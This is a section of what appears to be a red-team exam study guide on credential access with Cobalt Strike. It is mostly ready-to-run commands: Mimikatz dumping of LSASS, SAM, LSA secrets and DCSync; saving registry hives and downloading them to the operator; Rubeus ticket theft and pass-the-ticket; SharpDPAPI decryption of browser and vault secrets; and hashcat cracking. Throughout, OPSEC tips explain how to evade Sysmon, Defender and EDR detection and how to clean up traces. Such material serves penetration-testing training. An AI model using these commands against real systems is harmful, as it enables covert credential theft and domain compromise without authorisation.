## 7. Credential access

Credential theft is the highest-detection activity in the exam. **Take the quietest source that gives you what you need.** Public guidance from passing candidates is blunt: never touch `lsass.exe` on a monitored host if there is another path, and if you must, do it once, in a sacrificial process, and delete the dump.

### 7.1 Decision tree

```text
Do you have a token or ticket already in memory?
├─ Yes → use it (steal_token / ptt). No new credential access needed.
└─ No
   ├─ Need a user's password/hash to move laterally?
   │  ├─ Credential Manager / browser / DPAPI → Section 7.5–7.6 (quietest)
   │  ├─ Kerberos tickets in memory → Section 7.4
   │  ├─ SAM (local accounts) → Section 7.3 (needs admin)
   │  └─ LSASS (domain creds) → Section 7.2 (loudest; last resort)
   └─ Need domain-wide material (krbtgt, DCSync)?
      └─ Section 12 (requires domain privileges first)
```

### 7.2 Mimikatz via Beacon

Cobalt Strike runs Mimikatz in a sacrificial process (fork-and-run). The `!` prefix elevates the command to SYSTEM; `@` impersonates the beacon thread token.

```text
# Check you can reach LSASS
mimikatz !privilege::debug
mimikatz !sekurlsa::logonpasswords

# Kerberos material (more useful than plaintext for lateral movement)
mimikatz !sekurlsa::ekeys
mimikatz !sekurlsa::tickets

# Local SAM / LSA secrets / cached domain creds
mimikatz !lsadump::sam
mimikatz !lsadump::secrets
mimikatz !lsadump::cache

# Certificates (for ADCS / DPERSIST-1)
mimikatz !crypto::certificates /export
mimikatz !crypto::certificates /systemstore:local_machine /export

# DCSync (only after you have the rights — Section 12)
mimikatz !lsadump::dcsync /domain:<domain> /user:krbtgt
mimikatz !lsadump::dcsync /domain:<domain> /all
```

**What each gives you**

| Command | Output | Use |
|---|---|---|
| `sekurlsa::logonpasswords` | Plaintext (if reversible), NTLM, SHA1 | PTH, cracking |
| `sekurlsa::ekeys` | AES128/256 + RC4 Kerberos keys | Overpass-the-hash, golden/silver tickets |
| `sekurlsa::tickets` | Kerberos tickets in memory | Pass-the-ticket |
| `lsadump::sam` | Local SAM NTLM hashes | Local admin reuse |
| `lsadump::secrets` | LSA secrets (service accounts, machine account) | Pivoting, trust abuse |
| `lsadump::cache` | Cached domain credentials (DCC2) | Offline cracking |
| `crypto::certificates` | Certificates + private keys | ADCS abuse, persistence |

**OPSEC:**
- LSASS access is visible as **Sysmon 10** (`ProcessAccess` with `GrantedAccess 0x1010`/`0x1410`) and is a Defender ASR target ("Block credential stealing from lsass.exe").
- `mimikatz` in CS forks a process; the **parent** is your beacon's `spawnto` process. A `rundll32.exe` parent opening `lsass.exe` is a textbook detection.
- Do it **once**. Do not run `logonpasswords`, then `ekeys`, then `tickets` on the same host in a loop.
- Prefer `sekurlsa::ekeys` over `logonpasswords` when you need material for Kerberos: less plaintext, and AES keys are more OPSEC-friendly than RC4.
- Never do this on a DC, a CA, or the objective host unless there is no alternative.

### 7.3 SAM, LSA secrets, and offline extraction

When you have local admin/SYSTEM and want to avoid Mimikatz's LSASS signature:

```text
# Save hives, then exfiltrate and parse offline
reg save HKLM\SAM       C:\Windows\Temp\sam.hiv
reg save HKLM\SYSTEM    C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY  C:\Windows\Temp\security.hiv
download C:\Windows\Temp\sam.hiv
download C:\Windows\Temp\system.hiv
download C:\Windows\Temp\security.hiv
del C:\Windows\Temp\sam.hiv C:\Windows\Temp\system.hiv C:\Windows\Temp\security.hiv
```

```bash
# Operator side
secretsdump.py -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```

`secretsdump.py -ntds` against a DC copy is DCSync-equivalent and very loud; use only with rights and intent.

**OPSEC:** `reg save` writes files (Sysmon 11) and touches the registry. Delete the hives. Do not leave them in `C:\Temp` on a Tier-0 host.

### 7.4 Kerberos tickets (Rubeus)

```text
# See what is available
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe klist

# Dump tickets for a logon session
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x<id> /nowrap

# Pass a ticket into the current session
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /luid:0x<id> /ticket:<base64>

# Import a .kirbi file
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe ptt /ticket:<base64>

# Clear tickets
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe purge

# Monitor for new tickets (e.g., after coercion)
execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe monitor /interval:10 /nowrap
```

**OPSEC:** `dump`/`triage` read LSASS (same detection surface as Mimikatz, though lighter). `ptt` creates a logon session; `createnetonly` is often cleaner for using a ticket without a full interactive logon.

### 7.5 DPAPI

DPAPI protects credentials, browser secrets, scheduled-task passwords, and RDP saved credentials. Decryption usually needs the user's masterkey (from LSASS or the user's profile) or the machine key.

```text
# User masterkeys / credentials / vaults
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe masterkeys
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe vaults
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe rdg

# Machine context
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe machinemasterkeys
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe machinecredentials
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe certificates /machine

# Mimikatz equivalents
mimikatz dpapi::cred /in:C:\Users\<user>\AppData\Local\Microsoft\Credentials\<blob>
mimikatz dpapi::masterkey /in:C:\Users\<user>\AppData\Roaming\Microsoft\Protect\<SID>\<guid> /rpc
mimikatz !sekurlsa::dpapi
```

**OPSEC:** DPAPI decryption via `dpapi::masterkey ... /rpc` asks a DC for the backup key — a directory interaction. Prefer local user masterkeys when you already have them. Reading the user's profile is quieter than reading LSASS.

### 7.6 Credential Manager and browsers

```text
# Saved Windows credentials
cmdkey /list
mimikatz !vault::list
mimikatz !vault::cred /patch

# Chrome / Edge login data (DPAPI-protected)
mimikatz dpapi::chrome /in:"C:\Users\<user>\AppData\Local\Google\Chrome\User Data\Default\Login Data" /unprotect
```

```text
# SharpChromium / SharpDPAPI browser modules if available
execute-assembly C:\Tools\SharpDPAPI\SharpDPAPI\bin\Release\SharpDPAPI.exe credentials /target:chrome
```

**OPSEC:** reading a user's browser database touches a file (Sysmon 11) and may lock it. Copy the file first if needed, then delete the copy.

### 7.7 Where credentials hide

| Source | Tool | Requires | Noise |
|---|---|---|---|
| LSASS memory | Mimikatz / Rubeus dump | Admin/SYSTEM (or debug) | 🔊🔊 |
| SAM | `reg save` + secretsdump, `lsadump::sam` | Admin/SYSTEM | 🔊 |
| LSA secrets | `lsadump::secrets` | SYSTEM | 🔊 |
| Cached domain creds | `lsadump::cache` | SYSTEM | 🔊 |
| Kerberos tickets | Rubeus `triage`/`dump` | Admin (often) | 🔊 |
| DPAPI (user) | SharpDPAPI / Mimikatz | User context | 🟢 |
| Credential Manager | `vault::*`, `cmdkey` | User context | 🟢 |
| Browsers | `dpapi::chrome` | User context | 🟢 |
| GPO `cpassword` in SYSVOL | `findstr` + `Get-DecryptedCpassword` | Domain user | 🟢 |
| Unattended install files | `dir /s unattend.xml` | Local access | 🟢 |
| Files on shares | `Find-InterestingFile` | Share access | 🟢 |
| ADCS / certificates | Certify / SharpDPAPI | Varies | Depends |

### 7.8 Cracking quick reference

| Hash type | Hashcat mode | Source |
|---|---|---|
| NTLM | `-m 1000` | SAM, LSASS |
| NetNTLMv2 | `-m 5600` | Responder/relay capture |
| Kerberoast TGS (RC4) | `-m 13100` | `Rubeus kerberoast` |
| AS-REP | `-m 18200` | `Rubeus asreproast` |
| DCC2 (mscache2) | `-m 2100` | `lsadump::cache` |
| MSCache | `-m 2000` | Older cached creds |
| AES Kerberoast | `-m 19700` | Rare; slower |

```bash
hashcat -m 13100 -a 0 hashes.txt rockyou.txt -r rules/best64.rule
hashcat -m 18200 -a 0 asrep.txt rockyou.txt
hashcat -m 1000  -a 0 ntlm.txt rockyou.txt
```

**OPSEC:** cracking is offline and invisible. Do it on the operator side, not on the target host.

### 7.9 Troubleshooting

| Symptom | Cause | Fix |
|---|---|---|
| `ERROR kuhl_m_sekurlsa_acquireLSA` | Not admin/SYSTEM, or LSASS protected | Elevate (`getsystem`), or use another source |
| `mimikatz` returns nothing | AV/EDR stripped it, or wrong arch | Try `execute-assembly`-based tool; match arch |
| `0x80070005` on DPAPI | Wrong user context / no masterkey | Get the masterkey first; try `/rpc` |
| `hashdump` empty | Token not SYSTEM | `getsystem`, then retry |
| Beacon dies during Mimikatz | AV kills the sacrificial process | Change `spawnto`; use `blockdlls`; try `nanodump` |
| Ticket `ptt` works but access denied | Ticket for wrong SPN/service | Request the right service (`cifs/<host>`), or use S4U |

